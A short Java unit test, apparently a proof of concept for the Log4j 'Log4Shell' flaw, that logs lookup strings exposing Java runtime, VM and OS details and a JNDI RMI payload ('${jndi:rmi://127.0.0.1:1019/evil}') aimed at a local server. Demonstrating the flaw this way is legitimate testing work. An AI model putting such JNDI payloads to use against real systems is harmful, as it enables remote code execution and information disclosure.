package cn.burningbright.poc;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;


/**
 * Unit test for simple App.
 */
public class AppTest {

    /**
     * Rigorous Test :-)
     */
    @Test
    public void shouldAnswerWithTrue() {
        Logger logger = LogManager.getLogger();
        logger.error("hello {}", "${java:runtime} - ${java:vm} - ${java:os}");
        logger.error("remote {}", "${jndi:rmi://127.0.0.1:1019/evil}");
    }

}
